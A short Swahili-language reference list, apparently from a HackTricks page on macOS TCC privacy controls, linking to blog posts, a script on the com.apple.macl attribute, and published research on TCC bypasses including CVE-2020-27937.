- [1] [Uchambuzi wa kina wa macOS TCC.db - Blogu ya Rainforest QA](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
- [2] [maclTrack.command - script ya kufuatilia com.apple.macl (Gist ya brunerd)](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
- [3] [Fuatilia na Shughulikia com.apple.macl](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
- [4] [Kukwepa Ulinzi wa Faragha ya Mtumiaji wa macOS TCC kwa Ajali na kwa Makusudi](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [5] [Badilisha directory ya home na ukwepe TCC, yaani CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)

{{#include ../../../../banners/hacktricks-training.md}}
